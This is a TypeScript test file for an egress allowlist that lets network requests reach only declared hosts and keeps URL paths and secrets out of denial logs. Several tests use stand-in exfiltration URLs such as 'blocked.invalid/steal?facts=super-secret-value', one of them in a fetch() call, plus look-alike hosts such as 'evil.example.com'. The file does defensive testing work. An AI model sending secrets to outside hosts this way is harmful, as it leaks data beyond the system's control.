import { createServer } from 'node:http'
import type { Server } from 'node:http'
import { getGlobalDispatcher, setGlobalDispatcher } from 'undici'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import {
  EgressDeniedError,
  EgressPolicy,
  createEgressDispatcher,
  installEgressEnforcement,
} from './egress.ts'
import type { EgressDenial } from './egress.ts'

describe('EgressPolicy', () => {
  it('allows a declared host, case-insensitively', () => {
    const policy = new EgressPolicy()
    policy.allow('Api.Example.com')

    expect(policy.isAllowed('api.example.com')).toBe(true)
    expect(policy.isAllowed('API.EXAMPLE.COM')).toBe(true)
  })

  it('denies by default: an undeclared host is never allowed', () => {
    const policy = new EgressPolicy()
    policy.allow('api.example.com')

    expect(policy.isAllowed('blocked.invalid')).toBe(false)
  })

  it('accepts an iterable of hosts', () => {
    const policy = new EgressPolicy()
    policy.allow(['a.example.com', 'b.example.com'])

    expect(policy.isAllowed('a.example.com')).toBe(true)
    expect(policy.isAllowed('b.example.com')).toBe(true)
  })

  it('does not wildcard or suffix-match', () => {
    const policy = new EgressPolicy()
    policy.allow('example.com')

    expect(policy.isAllowed('evil.example.com')).toBe(false)
    expect(policy.isAllowed('example.com.evil.invalid')).toBe(false)
  })

  it('denies loopback by default (allowLoopback unset)', () => {
    const policy = new EgressPolicy()

    expect(policy.isAllowed('localhost')).toBe(false)
    expect(policy.isAllowed('127.0.0.1')).toBe(false)
    expect(policy.isAllowed('::1')).toBe(false)
  })

  it('allows loopback when allowLoopback is true, without declaring it', () => {
    const policy = new EgressPolicy({ allowLoopback: true })

    expect(policy.isAllowed('localhost')).toBe(true)
    expect(policy.isAllowed('127.0.0.1')).toBe(true)
    expect(policy.isAllowed('::1')).toBe(true)
    expect(policy.isAllowed('[::1]')).toBe(true)
  })

  it('check() throws EgressDeniedError for a denied host', () => {
    const policy = new EgressPolicy()

    expect(() => policy.check('https://blocked.invalid/path')).toThrow(EgressDeniedError)
  })

  it('check() passes silently for an allowed host', () => {
    const policy = new EgressPolicy()
    policy.allow('api.example.com')

    expect(() => policy.check('https://api.example.com/v1/chat')).not.toThrow()
  })

  it('EgressDeniedError carries the host but never the URL path or query', () => {
    const policy = new EgressPolicy()

    let caught: unknown
    try {
      policy.check('https://blocked.invalid/steal?facts=super-secret-value')
    } catch (error) {
      caught = error
    }

    expect(caught).toBeInstanceOf(EgressDeniedError)
    const error = caught as EgressDeniedError
    expect(error.host).toBe('blocked.invalid')
    expect(error.message).toContain('blocked.invalid')
    expect(error.message).not.toContain('steal')
    expect(error.message).not.toContain('super-secret-value')
    expect(error.message).not.toContain('?')
  })

  it('notifies denial listeners with {at, host} only, even for a URL with a query string', () => {
    const policy = new EgressPolicy({ now: () => new Date('2026-01-01T00:00:00.000Z') })
    const denials: EgressDenial[] = []
    policy.onDenial((denial) => denials.push(denial))

    expect(() => policy.check('https://blocked.invalid/steal?facts=super-secret-value')).toThrow()

    expect(denials).toHaveLength(1)
    expect(denials[0]).toEqual({ at: '2026-01-01T00:00:00.000Z', host: 'blocked.invalid' })
    expect(JSON.stringify(denials[0])).not.toContain('steal')
    expect(JSON.stringify(denials[0])).not.toContain('super-secret-value')
  })

  it('denies an unparseable origin (fail closed)', () => {
    const policy = new EgressPolicy()
    const denials: EgressDenial[] = []
    policy.onDenial((denial) => denials.push(denial))

    expect(() => policy.check('not a url at all')).toThrow(EgressDeniedError)
    expect(denials).toHaveLength(1)
    expect(denials[0]?.host).toBe('<unparseable>')
  })

  it('accepts a URL instance directly, including IPv6 bracket form', () => {
    const policy = new EgressPolicy({ allowLoopback: true })

    expect(() => policy.check(new URL('http://[::1]:8080/anything'))).not.toThrow()
  })

  it('allowedHosts() reports declared hosts sorted, for logging/debug', () => {
    const policy = new EgressPolicy()
    policy.allow(['zeta.example.com', 'alpha.example.com'])
    policy.allow('mid.example.com')

    expect(policy.allowedHosts()).toEqual([
      'alpha.example.com',
      'mid.example.com',
      'zeta.example.com',
    ])
  })
})

describe('createEgressDispatcher + built-in fetch (global-dispatcher sharing)', () => {
  let savedDispatcher: ReturnType<typeof getGlobalDispatcher>

  beforeEach(() => {
    // Other test files in this process share undici's global dispatcher —
    // never leak an installed policy past this suite.
    savedDispatcher = getGlobalDispatcher()
  })

  afterEach(() => {
    setGlobalDispatcher(savedDispatcher)
  })

  it('denies a fetch() to an undeclared host before any network I/O, and it is policy, not DNS', async () => {
    const policy = new EgressPolicy()
    installEgressEnforcement(policy)

    await expect(fetch('https://blocked.invalid/steal?facts=secret')).rejects.toSatisfy(
      (error: unknown) => {
        const cause = error instanceof Error && 'cause' in error ? error.cause : undefined
        const denial = cause instanceof EgressDeniedError ? cause : error
        return denial instanceof EgressDeniedError && denial.host === 'blocked.invalid'
      },
    )
  })

  it('logs the denial via the onDenial hook for a blocked fetch()', async () => {
    const policy = new EgressPolicy()
    const denials: EgressDenial[] = []
    policy.onDenial((denial) => denials.push(denial))
    installEgressEnforcement(policy)

    await expect(fetch('https://blocked.invalid/steal?facts=secret')).rejects.toThrow()

    expect(denials).toHaveLength(1)
    expect(denials[0]?.host).toBe('blocked.invalid')
  })

  it('allows a fetch() to a declared loopback host to actually reach the server', async () => {
    let server: Server | undefined
    try {
      server = createServer((_req, res) => {
        res.writeHead(200, { 'content-type': 'text/plain' })
        res.end('ok')
      })
      const port = await new Promise<number>((resolve) => {
        server?.listen(0, '127.0.0.1', () => {
          const address = server?.address()
          resolve(typeof address === 'object' && address !== null ? address.port : 0)
        })
      })

      const policy = new EgressPolicy({ allowLoopback: true })
      installEgressEnforcement(policy)

      const response = await fetch(`http://127.0.0.1:${port}/`)
      expect(response.status).toBe(200)
      expect(await response.text()).toBe('ok')
    } finally {
      await new Promise<void>((resolve) => server?.close(() => resolve()))
    }
  })
})

describe('createEgressDispatcher (direct)', () => {
  it('returns a Dispatcher usable via setGlobalDispatcher without throwing', () => {
    const policy = new EgressPolicy()
    expect(() => createEgressDispatcher(policy)).not.toThrow()
  })
})
